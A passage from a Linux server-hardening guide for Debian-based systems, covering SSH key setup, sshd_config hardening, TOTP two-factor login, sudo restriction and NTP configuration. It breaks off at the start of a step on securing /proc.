Distribution\\n\\nThis guide is intended to be distribution agnostic so users can use [any distribution](https://distrowatch.com/) they want. With that said, there are a few things to keep in mind:\\n\\nYou want a distribution that...\\n\\n- ...**is stable**. Unless you like debugging issues at 2 AM, you don't want an [unattended upgrade](#automatic-security-updates-and-alerts), or a manual package/system update, to render your server inoperable. But this also means you're okay with not running the latest, greatest, bleeding edge software.\\n- ...**stays up-to-date with security patches**. You can secure everything on your server, but if the core OS or applications you're running have known vulnerabilities, you'll never be safe.\\n- ...**you're familiar with.** If you don't know Linux, I would advise you play around with one before you try to secure it. You should be comfortable with it and know your way around, like how to install software, where configuration files are, etc...\\n- ...**is well supported.** Even the most seasoned admin needs help every now and then. Having a place to go for help will save your sanity.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Installing Linux\\n\\nInstalling Linux is out-of-scope for this guide because each distribution does it differently and the installation instructions are usually well documented. If you need help, start with your distribution's documentation. Regardless of the distribution, the high-level process usually goes like so:\\n\\n1. download the ISO\\n1. burn/copy/transfer it to your install medium (e.g. a CD or USB stick)\\n1. boot your server from your install medium\\n1. follow the prompts to install\\n\\nWhere applicable, use the expert install option so you have tighter control of what is running on your server. **Only install what you absolutely need.** I, personally, do not install anything other than SSH.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Pre/Post Installation Requirements\\n\\n- If you're opening ports on your router so you can access your server from the outside, disable the port forwarding until your system is up and secured.\\n- Unless you're doing everything physically connected to your server, you'll need remote access so be sure SSH works.\\n- Keep your system up-to-date (i.e. `sudo apt update && sudo apt upgrade` on Debian based systems).\\n- Make sure you perform any tasks specific to your setup like:\\n - Configuring network\\n - Configuring mount points in `/etc/fstab`\\n - Creating the initial user accounts\\n - Installing core software you'll want like `man`\\n - Etc...\\n- Your server will need to be able to send e-mails so you can get important security alerts. If you're not setting up a mail server check [Gmail and Exim4 As MTA With Implicit TLS](#gmail-and-exim4-as-mta-with-implicit-tls).\\n- I would also recommend you go through the [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/) before you start with this guide.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Other Important Notes\\n\\n- This guide is being written and tested on Debian. Most things below should work on other distributions. If you find something that does not, please [contact me](#contacting-me). The main thing that separates each distribution will be its package management system. Since I use Debian, I will provide the appropriate `apt` commands that should work on all [Debian based distributions](https://www.debian.org/derivatives/). If someone is willing to [provide](#contributing) the respective commands for other distributions, I will add them.\\n- File paths and settings also may differ slightly -- check with your distribution's documentation if you have issues.\\n- Read the whole guide before you start. Your use-case and/or principals may call for not doing something or for changing the order.\\n- Do not **blindly** copy-and-paste without understanding what you're pasting. Some commands will need to be modified for your needs before they'll work -- usernames for example.\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The SSH Server\\n\\n### SSH Public/Private Keys\\n\\n#### Why\\n\\nUsing SSH public/private keys is more secure than using a password. It also makes it easier and faster, to connect to our server because you don't have to enter a password.\\n\\n#### How It Works\\n\\nCheck the references below for more details but, at a high level, public/private keys work by using a pair of keys to verify identity.\\n\\n1. One key, the **public** key, **can only encrypt data**, not decrypt it\\n1. The other key, the **private** key, can decrypt the data\\n\\nFor SSH, a public and private key is created on the client. You want to keep both keys secure, especially the private key. Even though the public key is meant to be public, it is wise to make sure neither keys fall in the wrong hands.\\n\\nWhen you connect to an SSH server, SSH will look for a public key that matches the client you're connecting from in the file `~/.ssh/authorized_keys` on the server you're connecting to. Notice the file is in the **home folder** of the ID you're trying to connect to. So, after creating the public key, you need to append it to `~/.ssh/authorized_keys`. One approach is to copy it to a USB stick and physically transfer it to the server. Anther approach is to use use [`ssh-copy-id`](https://www.ssh.com/ssh/copy-id) to transfer and append the public key.\\n\\nAfter the keys have been created and the public key has been appended to `~/.ssh/authorized_keys` on the host, SSH uses the public and private keys to verify identity and then establish a secure connection. How identity is verified is a complicated process but [Digital Ocean](https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process) has a very nice write-up of how it works. At a high level, identity is verified by the server encrypting a challenge message with the public key, then sending it to the client. If the client cannot decrypt the challenge message with the private key, the identity can't be verified and a connection will not be established.\\n\\nThey are considered more secure because you need the private key to establish an SSH connection. If you set [`PasswordAuthentication no` in `/etc/ssh/sshd_config`](#PasswordAuthentication), then SSH won't let you connect without the private key.\\n\\nYou can also set a pass-phrase for the keys which would require you to enter the key pass-phrase when connecting using public/private keys. Keep in mind doing this means you can't use the key for automation because you'll have no way to send the passphrase in your scripts. `ssh-agent` is a program that is shipped in many Linux distros (and usually already running) that will allow you to hold your unencrypted private key in memory for a configurable duration. Simply run `ssh-add` and it will prompt you for your passphrase. You will not be prompted for your passphrase again until the configurable duration has passed.\\n\\nWe will be using Ed25519 keys which, according to [https://linux-audit.com/](https://linux-audit.com/using-ed25519-openssh-keys-instead-of-dsa-rsa-ecdsa/):\\n\\n> It is using an elliptic curve signature scheme, which offers better security than ECDSA and DSA. At the same time, it also has good performance.\\n\\n#### Goals\\n\\n- Ed25519 public/private SSH keys:\\n - private key on your client\\n - public key on your server\\n\\n#### Notes\\n\\n- You'll need to do this step for every computer and account you'll be connecting to your server from/as.\\n\\n#### References\\n\\n- https://www.ssh.com/ssh/public-key-authentication\\n- https://help.ubuntu.com/community/SSH/OpenSSH/Keys\\n- https://linux-audit.com/using-ed25519-openssh-keys-instead-of-dsa-rsa-ecdsa/\\n- https://www.digitalocean.com/community/tutorials/understanding-the-ssh-encryption-and-connection-process\\n- https://wiki.archlinux.org/index.php/SSH_Keys\\n- https://www.ssh.com/ssh/copy-id\\n- `man ssh-keygen`\\n- `man ssh-copy-id`\\n- `man ssh-add`\\n\\n#### Steps\\n\\n1. From the computer you're going to use to connect to your server, **the client**, not the server itself, create an [Ed25519](https://linux-audit.com/using-ed25519-openssh-keys-instead-of-dsa-rsa-ecdsa/) key with `ssh-keygen`:\\n\\n ``` bash\\n ssh-keygen -t ed25519\\n ```\\n\\n > ```\\n > Generating public/private ed25519 key pair.\\n > Enter file in which to save the key (/home/user/.ssh/id_ed25519):\\n > Created directory '/home/user/.ssh'.\\n > Enter passphrase (empty for no passphrase):\\n > Enter same passphrase again:\\n > Your identification has been saved in /home/user/.ssh/id_ed25519.\\n > Your public key has been saved in /home/user/.ssh/id_ed25519.pub.\\n > The key fingerprint is:\\n > SHA256:F44D4dr2zoHqgj0i2iVIHQ32uk/Lx4P+raayEAQjlcs user@client\\n > The key's randomart image is:\\n > +--[ED25519 256]--+\\n > |xxxx x |\\n > |o.o +. . |\\n > | o o oo . |\\n > |. E oo . o . |\\n > | o o. o S o |\\n > |... .. o o |\\n > |.+....+ o |\\n > |+.=++o.B.. |\\n > |+..=**=o=. |\\n > +----[SHA256]-----+\\n > ```\\n\\n **Note**: If you set a passphrase, you'll need to enter it every time you connect to your server using this key, unless you're using `ssh-agent`.\\n\\n1. Now you need to **append** the public key `~/.ssh/id_ed25519.pub` from your client to the `~/.ssh/authorized_keys` file on your server. Since we're presumable still at home on the LAN, we're probably safe from [MIM](https://en.wikipedia.org/wiki/Man-in-the-middle_attack) attacks, so we will use `ssh-copy-id` to transfer and append the public key:\\n\\n ``` bash\\n ssh-copy-id user@server\\n ```\\n\\n > ```\\n > /usr/bin/ssh-copy-id: INFO: Source of key(s) to be installed: \\\"/home/user/.ssh/id_ed25519.pub\\\"\\n > The authenticity of host 'host (192.168.1.96)' can't be established.\\n > ECDSA key fingerprint is SHA256:QaDQb/X0XyVlogh87sDXE7MR8YIK7ko4wS5hXjRySJE.\\n > Are you sure you want to continue connecting (yes/no)? yes\\n > /usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed\\n > /usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys\\n > user@host's password:\\n > \\n > Number of key(s) added: 1\\n > \\n > Now try logging into the machine, with: \\\"ssh 'user@host'\\\"\\n > and check to make sure that only the key(s) you wanted were added.\\n > ```\\n\\nNow would be a good time to [perform any tasks specific to your setup](#prepost-installation-requirements).\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Create SSH Group For AllowGroups\\n\\n#### Why\\n\\nTo make it easy to control who can SSH to the server. By using a group, we can quickly add/remove accounts to the group to quickly allow or not allow SSH access to the server.\\n\\n#### How It Works\\n\\nWe will use the [AllowGroups option](#AllowGroups) in SSH's configuration file [`/etc/ssh/sshd_config`](#secure-etcsshsshd_config). to tell the SSH server to only allow users to SSH in if they are a member of a certain UNIX group. Anyone not in the group will not be able to SSH in.\\n\\n#### Goals\\n\\n- a UNIX group that we'll use in [Secure `/etc/ssh/sshd_config`](#secure-etcsshsshd_config) to limit who can SSH to the server\\n\\n#### Notes\\n\\n- This is a per-requisite step to support the `AllowGroup` setting set in [Secure `/etc/ssh/sshd_config`](#secure-etcsshsshd_config).\\n\\n#### References\\n\\n- `man groupadd`\\n- `man usermod`\\n\\n#### Steps\\n\\n1. Create a group:\\n\\n ``` bash\\n sudo groupadd sshusers\\n ```\\n\\n1. Add account(s) to the group:\\n\\n ``` bash\\n sudo usermod -a -G sshusers user1\\n sudo usermod -a -G sshusers user2\\n sudo usermod -a -G sshusers ...\\n ```\\n\\n You'll need to do this for every account on your server that needs SSH access.\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Secure `/etc/ssh/sshd_config`\\n\\n#### Why\\n\\nSSH is a door into your server. This is especially true if you are opening ports on your router so you can SSH to your server from outside your home network. If it is not secured properly, a bad-actor could use it to gain unauthorized access to your system.\\n\\n#### How It Works\\n\\n`/etc/ssh/sshd_config` is the default configuration file that the SSH server uses. We will use this file to tell what options the SSH server should use.\\n\\n#### Goals\\n\\n- a secure SSH configuration\\n\\n#### Notes\\n\\n- Make sure you've completed [Create SSH Group For AllowGroups](#create-ssh-group-for-allowgroups) first.\\n\\n#### References\\n\\n- Mozilla's OpenSSH guidelines for OpenSSH 6.7+ at https://infosec.mozilla.org/guidelines/openssh#modern-openssh-67\\n- https://linux-audit.com/audit-and-harden-your-ssh-configuration/\\n- https://www.ssh.com/ssh/sshd_config/\\n- https://www.techbrown.com/harden-ssh-secure-linux-vps-server/\\n- https://serverfault.com/questions/660160/openssh-difference-between-internal-sftp-and-sftp-server/660325\\n- `man sshd_config`\\n\\n#### Steps\\n\\n1. Make a backup of OpenSSH server's configuration file `/etc/ssh/sshd_config` and remove comments to make it easier to read:\\n\\n ``` bash\\n sudo cp --archive /etc/ssh/sshd_config /etc/ssh/sshd_config-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n sudo sed -i -r -e '/^#|^$/ d' /etc/ssh/sshd_config\\n ```\\n\\n1. Edit `/etc/ssh/sshd_config` then find and edit or add these settings that should be applied regardless of your configuration/setup:\\n\\n **Note**: SSH does not like duplicate contradicting settings. For example, if you have `ChallengeResponseAuthentication no` and then `ChallengeResponseAuthentication yes`, SSH will respect the first one and ignore the second. Your `/etc/ssh/sshd_config` file may already have some of the settings/lines below. To avoid issues you will need to manually go through your `/etc/ssh/sshd_config` file and address any duplicate contradicting settings. (If anyone knows a way to programatically do this I would [love to hear how](#contacting-me).)\\n\\n ```\\n ########################################################################################################\\n # start settings from https://infosec.mozilla.org/guidelines/openssh#modern-openssh-67 as of 2019-01-01\\n ########################################################################################################\\n\\n # Supported HostKey algorithms by order of preference.\\n HostKey /etc/ssh/ssh_host_ed25519_key\\n HostKey /etc/ssh/ssh_host_rsa_key\\n HostKey /etc/ssh/ssh_host_ecdsa_key\\n\\n KexAlgorithms curve25519-sha256@libssh.org,ecdh-sha2-nistp521,ecdh-sha2-nistp384,ecdh-sha2-nistp256,diffie-hellman-group-exchange-sha256\\n\\n Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr\\n\\n MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-512,hmac-sha2-256,umac-128@openssh.com\\n\\n # LogLevel VERBOSE logs user's key fingerprint on login. Needed to have a clear audit track of which key was using to log in.\\n LogLevel VERBOSE\\n\\n # Use kernel sandbox mechanisms where possible in unprivileged processes\\n # Systrace on OpenBSD, Seccomp on Linux, seatbelt on MacOSX/Darwin, rlimit elsewhere.\\n # Note: This setting is deprecated in OpenSSH 7.5 (https://www.openssh.com/txt/release-7.5)\\n UsePrivilegeSeparation sandbox\\n\\n ########################################################################################################\\n # end settings from https://infosec.mozilla.org/guidelines/openssh#modern-openssh-67 as of 2019-01-01\\n ########################################################################################################\\n\\n # don't let users set environment variables\\n PermitUserEnvironment no\\n\\n # Log sftp level file access (read/write/etc.) that would not be easily logged otherwise.\\n Subsystem sftp internal-sftp -f AUTHPRIV -l INFO\\n\\n # only use the newer, more secure protocol\\n Protocol 2\\n\\n # disable X11 forwarding as X11 is very insecure\\n # you really shouldn't be running X on a server anyway\\n X11Forwarding no\\n\\n # disable port forwarding\\n AllowTcpForwarding no\\n AllowStreamLocalForwarding no\\n GatewayPorts no\\n PermitTunnel no\\n\\n # don't allow login if the account has an empty password\\n PermitEmptyPasswords no\\n\\n # ignore .rhosts and .shosts\\n IgnoreRhosts yes\\n\\n # verify hostname matches IP\\n UseDNS no\\n\\n Compression no\\n TCPKeepAlive no\\n AllowAgentForwarding no\\n PermitRootLogin no\\n\\n # don't allow .rhosts or /etc/hosts.equiv\\n HostbasedAuthentication no\\n ```\\n\\n1. Then **find and edit or add** these settings, and set values as per your requirements:\\n\\n |Setting|Valid Values|Example|Description|Notes|\\n |--|--|--|--|--|\\n |<a name=\\\"AllowGroups\\\"></a>**AllowGroups**|local UNIX group name|`AllowGroups sshusers`|group to allow SSH access to||\\n |**ClientAliveCountMax**|number|`ClientAliveCountMax 0`|maximum number of client alive messages sent without response||\\n |**ClientAliveInterval**|number of seconds|`ClientAliveInterval 300`|timeout in seconds before a response request||\\n |**ListenAddress**|space separated list of local addresses|<ul><li>`ListenAddress 0.0.0.0`</li><li>`ListenAddress 192.168.1.100`</li></ul>|local addresses `sshd` should listen on|See [Issue #1](https://github.com/imthenachoman/How-To-Secure-A-Linux-Server/issues/1) for important details.|\\n |**LoginGraceTime**|number of seconds|`LoginGraceTime 30`|time in seconds before login times-out||\\n |**MaxAuthTries**|number|`MaxAuthTries 2`|maximum allowed attempts to login||\\n |**MaxSessions**|number|`MaxSessions 2`|maximum number of open sessions||\\n |**MaxStartups**|number|`MaxStartups 2`|maximum number of login sessions||\\n |<a name=\\\"PasswordAuthentication\\\"></a>**PasswordAuthentication**|`yes` or `no`|`PasswordAuthentication no`|if login with a password is allowed||\\n |**Port**|any open/available port number|`Port 22`|port that `sshd` should listen on||\\n\\n Check `man sshd_config` for more details what these settings mean.\\n\\n1. Restart ssh:\\n\\n ``` bash\\n sudo service sshd restart\\n ```\\n\\n1. You can check verify the configurations worked with `sshd -T` and verify the output:\\n\\n ``` bash\\n sudo sshd -T\\n ```\\n\\n > ```\\n > port 22\\n > addressfamily any\\n > listenaddress [::]:22\\n > listenaddress 0.0.0.0:22\\n > usepam yes\\n > logingracetime 30\\n > x11displayoffset 10\\n > maxauthtries 2\\n > maxsessions 2\\n > clientaliveinterval 300\\n > clientalivecountmax 0\\n > streamlocalbindmask 0177\\n > permitrootlogin no\\n > ignorerhosts yes\\n > ignoreuserknownhosts no\\n > hostbasedauthentication no\\n > ...\\n > subsystem sftp internal-sftp -f AUTHPRIV -l INFO\\n > maxstartups 2:30:2\\n > permittunnel no\\n > ipqos lowdelay throughput\\n > rekeylimit 0 0\\n > permitopen any\\n > ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Remove Short Diffie-Hellman Keys\\n\\n#### Why\\n\\nPer [Mozilla's OpenSSH guidelines for OpenSSH 6.7+](https://infosec.mozilla.org/guidelines/openssh#modern-openssh-67), \\\"all Diffie-Hellman moduli in use should be at least 3072-bit-long\\\".\\n\\nThe Diffie-Hellman algorithm is used by SSH to establish a secure connection. The larger the moduli (key size) the stronger the encryption.\\n\\n#### Goals\\n\\n- remove all Diffie-Hellman keys that are less than 3072 bits long\\n\\n#### References\\n\\n- Mozilla's OpenSSH guidelines for OpenSSH 6.7+ at https://infosec.mozilla.org/guidelines/openssh#modern-openssh-67\\n- https://infosec.mozilla.org/guidelines/key_management\\n- `man moduli`\\n\\n#### Steps\\n\\n1. Make a backup of SSH's moduli file `/etc/ssh/moduli`:\\n\\n ``` bash\\n sudo cp --archive /etc/ssh/moduli /etc/ssh/moduli-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Remove short moduli:\\n\\n ``` bash\\n sudo awk '$5 >= 3071' /etc/ssh/moduli | sudo tee /etc/ssh/moduli.tmp\\n sudo mv /etc/ssh/moduli.tmp /etc/ssh/moduli\\n ````\\n\\n([Table of Contents](#table-of-contents))\\n\\n### 2FA/MFA for SSH\\n\\n#### Why\\n\\nEven though SSH is a pretty good security guard for your doors and windows, it is still a visible door that bad-actors can see and try to brute-force in. [Fail2ban](#fail2ban-application-intrusion-detection-and-prevention) will monitor for these brute-force attempts but there is no such thing as being too secure. Requiring two factors adds an extra layer of security.\\n\\nUsing Two Factor Authentication (2FA) / Multi Factor Authentication (MFA) requires anyone entering to have **two** keys to enter which makes it harder for bad actors. The two keys are:\\n\\n1. Their password\\n1. A 6 digit token that changes every 30 seconds\\n\\nWithout both keys, they won't be able to get in.\\n\\n#### Why Not\\n\\nMany folks might find the experience cumbersome or annoying. And, access to your system is dependent on the accompanying authenticator app that generates the code.\\n\\n#### How It Works\\n\\nOn Linux, PAM is responsible for authentication. There are four tasks to PAM that you can read about at https://en.wikipedia.org/wiki/Linux_PAM. This section talks about the authentication task.\\n\\nWhen you log into a server, be it directly from the console or via SSH, the door you came through will send the request to the authentication task of PAM and PAM will ask for and verify your password. You can customize the rules each doors use. For example, you could have one set of rules when logging in directly from the console and another set of rules for when logging in via SSH.\\n\\nThis section will alter the authentication rules for when logging in via SSH to require both a password and a 6 digit code.\\n\\nWe will use Google's libpam-google-authenticator PAM module to create and verify a [TOTP](https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm) key. https://fastmail.blog/2016/07/22/how-totp-authenticator-apps-work/ and https://jemurai.com/2018/10/11/how-it-works-totp-based-mfa/ have very good writeups of how TOTP works.\\n\\nWhat we will do is tell the server's SSH PAM configuration to ask the user for their password and then their numeric token. PAM will then verify the user's password and, if it is correct, then it will route the authentication request to libpam-google-authenticator which will ask for and verify your 6 digit token. If, and only if, everything is good will the authentication succeed and user be allowed to log in.\\n\\n#### Goals\\n\\n- 2FA/MFA enabled for all SSH connections\\n\\n#### Notes\\n\\n- Before you do this, you should have an idea of how 2FA/MFA works and you'll need an authenticator app on your phone to continue.\\n- We'll use [google-authenticator-libpam](https://github.com/google/google-authenticator-libpam).\\n- With the below configuration, a user will only need to enter their 2FA/MFA code if they are logging on with their password but **not** if they are using [SSH public/private keys](#ssh-publicprivate-keys). Check the documentation on how to change this behavior to suite your requirements.\\n\\n#### References\\n\\n- https://github.com/google/google-authenticator-libpam\\n- https://en.wikipedia.org/wiki/Linux_PAM\\n- https://en.wikipedia.org/wiki/Time-based_One-time_Password_algorithm\\n- https://fastmail.blog/2016/07/22/how-totp-authenticator-apps-work/\\n- https://jemurai.com/2018/10/11/how-it-works-totp-based-mfa/\\n\\n#### Steps\\n\\n1. Install it libpam-google-authenticator.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install libpam-google-authenticator\\n ```\\n\\n1. **Make sure you're logged in as the ID you want to enable 2FA/MFA for** and **execute** `google-authenticator` to create the necessary token data:\\n\\n ``` bash\\n google-authenticator\\n ```\\n\\n > ```\\n > Do you want authentication tokens to be time-based (y/n) y\\n > https://www.google.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth://totp/user@host%3Fsecret%3DR4ZWX34FQKZROVX7AGLJ64684Y%26issuer%3Dhost\\n > \\n > ...\\n > \\n > Your new secret key is: R3NVX3FFQKZROVX7AGLJUGGESY\\n > Your verification code is 751419\\n > Your emergency scratch codes are:\\n > 12345678\\n > 90123456\\n > 78901234\\n > 56789012\\n > 34567890\\n > \\n > Do you want me to update your \\\"/home/user/.google_authenticator\\\" file (y/n) y\\n > \\n > Do you want to disallow multiple uses of the same authentication\\n > token? This restricts you to one login about every 30s, but it increases\\n > your chances to notice or even prevent man-in-the-middle attacks (y/n) Do you want to disallow multiple uses of the same authentication\\n > token? This restricts you to one login about every 30s, but it increases\\n > your chances to notice or even prevent man-in-the-middle attacks (y/n) y\\n > \\n > By default, tokens are good for 30 seconds. In order to compensate for\\n > possible time-skew between the client and the server, we allow an extra\\n > token before and after the current time. If you experience problems with\\n > poor time synchronization, you can increase the window from its default\\n > size of +-1min (window size of 3) to about +-4min (window size of\\n > 17 acceptable tokens).\\n > Do you want to do so? (y/n) y\\n > \\n > If the computer that you are logging into isn't hardened against brute-force\\n > login attempts, you can enable rate-limiting for the authentication module.\\n > By default, this limits attackers to no more than 3 login attempts every 30s.\\n > Do you want to enable rate-limiting (y/n) y\\n > ```\\n\\n Notice this is **not run as root**.\\n\\n Select default option (y in most cases) for all the questions it asks and remember to save the emergency scratch codes.\\n\\n1. Make a backup of PAM's SSH configuration file `/etc/pam.d/sshd`:\\n\\n ``` bash\\n sudo cp --archive /etc/pam.d/sshd /etc/pam.d/sshd-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Now we need to enable it as an authentication method for SSH by adding this line to `/etc/pam.d/sshd`:\\n\\n ```\\n auth required pam_google_authenticator.so nullok\\n ```\\n\\n **Note**: Check [here](https://github.com/google/google-authenticator-libpam/blob/master/README.md#nullok) for what `nullok` means.\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n echo -e \\\"\\\\nauth required pam_google_authenticator.so nullok # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/pam.d/sshd\\n ```\\n\\n1. Tell SSH to leverage it by adding or editing this line in `/etc/ssh/sshd_config`:\\n\\n ```\\n ChallengeResponseAuthentication yes\\n ```\\n\\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n\\n ``` bash\\n sudo sed -i -r -e \\\"s/^(challengeresponseauthentication .*)$/# \\\\1 # commented by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")/I\\\" /etc/ssh/sshd_config\\n echo -e \\\"\\\\nChallengeResponseAuthentication yes # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/ssh/sshd_config\\n ```\\n\\n1. Restart ssh:\\n\\n ``` bash\\n sudo service sshd restart\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n## The Basics\\n\\n### Limit Who Can Use sudo\\n\\n#### Why\\n\\nsudo lets accounts run commands as other accounts, including **root**. We want to make sure that only the accounts we want can use sudo.\\n\\n#### Goals\\n\\n- sudo privileges limited to those who are in a group we specify\\n\\n#### Notes\\n\\n- Your installation may have already done this, or may already have a special group intended for this purpose so check first.\\n - Debian creates the sudo group\\n - RedHat creates the wheel group\\n\\n#### Steps\\n\\n1. Create a group:\\n\\n ``` bash\\n sudo groupadd sudousers\\n ```\\n\\n1. Add account(s) to the group:\\n\\n ``` bash\\n sudo usermod -a -G sudousers user1\\n sudo usermod -a -G sudousers user2\\n sudo usermod -a -G sudousers ...\\n ```\\n\\n You'll need to do this for every account on your server that needs sudo privileges.\\n\\n1. Make a backup of the sudo's configuration file `/etc/sudoers`:\\n\\n ``` bash\\n sudo cp --archive /etc/sudoers /etc/sudoers-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. Edit sudo's configuration file `/etc/sudoers`:\\n\\n ``` bash\\n sudo visudo\\n ```\\n\\n1. Tell sudo to only allow users in the `sudousers` group to use sudo by adding this line if it is not already there:\\n\\n ```\\n %sudousers ALL=(ALL:ALL) ALL\\n ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### NTP Client\\n\\n#### Why\\n\\nMany security protocols leverage the time. If your system time is incorrect, it could have negative impacts to your server. An NTP client can solve that problem by keeping your system time in-sync with [global NTP servers](https://en.wikipedia.org/wiki/Network_Time_Protocol)\\n\\n#### How It Works\\n\\nNTP stands for Network Time Protocol. In the context of this guide, an NTP client on the server is used to update the server time with the official time pulled from official servers. Check https://www.pool.ntp.org/en/ for all of the public NTP servers.\\n\\n#### Goals\\n\\n- NTP client installed and keeping server time in-sync\\n\\n#### References\\n\\n- https://cloudpro.zone/index.php/2018/01/27/debian-9-3-server-setup-guide-part-4/\\n- https://en.wikipedia.org/wiki/Network_Time_Protocol\\n- https://www.pool.ntp.org/en/\\n- https://serverfault.com/questions/957302/securing-hardening-ntp-client-on-linux-servers-config-file/957450#957450\\n- https://tf.nist.gov/tf-cgi/servers.cgi\\n\\n#### Steps\\n\\n1. Install ntp.\\n\\n On Debian based systems:\\n\\n ``` bash\\n sudo apt install ntp\\n ```\\n \\n1. Make a backup of the NTP client's configuration file `/etc/ntp.conf`:\\n\\n ``` bash\\n sudo cp --archive /etc/ntp.conf /etc/ntp.conf-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n ```\\n\\n1. The default configuration, at least on Debian, is already pretty secure. The only thing we'll want to make sure is we're the `pool` directive and not any `server` directives. The `pool` directive allows the NTP client to stop using a server if it is unresponsive or serving bad time. Do this by commenting out all `server` directives and adding the below to `/etc/ntp.conf`.\\n \\n ```\\n pool pool.ntp.org iburst\\n ```\\n \\n [For the lazy](#editing-configuration-files---for-the-lazy):\\n \\n ``` bash\\n sudo sed -i -r -e \\\"s/^((server|pool).*)/# \\\\1 # commented by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")/\\\" /etc/ntp.conf\\n echo -e \\\"\\\\npool pool.ntp.org iburst # added by $(whoami) on $(date +\\\"%Y-%m-%d @ %H:%M:%S\\\")\\\" | sudo tee -a /etc/ntp.conf\\n ```\\n\\n **Example `/etc/ntp.conf`**:\\n \\n > ```\\n > driftfile /var/lib/ntp/ntp.drift\\n > statistics loopstats peerstats clockstats\\n > filegen loopstats file loopstats type day enable\\n > filegen peerstats file peerstats type day enable\\n > filegen clockstats file clockstats type day enable\\n > restrict -4 default kod notrap nomodify nopeer noquery limited\\n > restrict -6 default kod notrap nomodify nopeer noquery limited\\n > restrict 127.0.0.1\\n > restrict ::1\\n > restrict source notrap nomodify noquery\\n > pool pool.ntp.org iburst # added by user on 2019-03-09 @ 10:23:35\\n > ```\\n \\n1. Restart ntp:\\n\\n ``` bash\\n sudo service ntp restart\\n ```\\n\\n1. Check the status of the ntp service:\\n\\n ``` bash\\n sudo systemctl status ntp\\n ```\\n\\n > ```\\n > \\u25cf ntp.service - LSB: Start NTP daemon\\n > Loaded: loaded (/etc/init.d/ntp; generated; vendor preset: enabled)\\n > Active: active (running) since Sat 2019-03-09 15:19:46 EST; 4s ago\\n > Docs: man:systemd-sysv-generator(8)\\n > Process: 1016 ExecStop=/etc/init.d/ntp stop (code=exited, status=0/SUCCESS)\\n > Process: 1028 ExecStart=/etc/init.d/ntp start (code=exited, status=0/SUCCESS)\\n > Tasks: 2 (limit: 4915)\\n > CGroup: /system.slice/ntp.service\\n > \\u2514\\u25001038 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -u 108:113\\n > \\n > Mar 09 15:19:46 host ntpd[1038]: Listen and drop on 0 v6wildcard [::]:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listen and drop on 1 v4wildcard 0.0.0.0:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listen normally on 2 lo 127.0.0.1:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listen normally on 3 enp0s3 10.10.20.96:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listen normally on 4 lo [::1]:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listen normally on 5 enp0s3 [fe80::a00:27ff:feb6:ed8e%2]:123\\n > Mar 09 15:19:46 host ntpd[1038]: Listening on routing socket on fd #22 for interface updates\\n > Mar 09 15:19:47 host ntpd[1038]: Soliciting pool server 108.61.56.35\\n > Mar 09 15:19:48 host ntpd[1038]: Soliciting pool server 69.89.207.199\\n > Mar 09 15:19:49 host ntpd[1038]: Soliciting pool server 45.79.111.114\\n > ```\\n\\n1. Check ntp's status:\\n\\n ``` bash\\n sudo ntpq -p\\n ```\\n\\n > ```\\n > remote refid st t when poll reach delay offset jitter\\n > ==============================================================================\\n > pool.ntp.org .POOL. 16 p - 64 0 0.000 0.000 0.000\\n > *lithium.constan 198.30.92.2 2 u - 64 1 19.900 4.894 3.951\\n > ntp2.wiktel.com 212.215.1.157 2 u 2 64 1 48.061 -0.431 0.104\\n > ```\\n\\n([Table of Contents](#table-of-contents))\\n\\n### Securing /proc\\n\\n#### Why\\n\\nTo quote https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/:\\n\\n> When looking in `/proc` you will discover a lot of files and directories. Many of them are just numbers, which represent the information about a particular process ID (PID). By default, Linux systems are deployed to allow all local users to see this all information. This includes process information from other users. This could include sensitive details that you may not want to share with other users. By applying some filesystem configuration tweaks, we can change this behavior and improve the security of the system.\\n\\n#### Goals\\n\\n- `/proc` mounted with `hidepid=2` so users can only see information about their processes\\n\\n#### References\\n\\n- https://linux-audit.com/linux-system-hardening-adding-hidepid-to-proc/\\n- https://likegeeks.com/secure-linux-server-hardening-best-practices/#Hardening-proc-Directory\\n- https://www.cyberciti.biz/faq/linux-hide-processes-from-other-users/\\n\\n#### Steps\\n\\n1. Make a backup of `/etc/fstab`:\\n\\n ``` bash\\n sudo cp --archive /etc/fstab /etc/fstab-COPY-$(date +\\\"%Y%m%d%H%M%S\\\")\\n 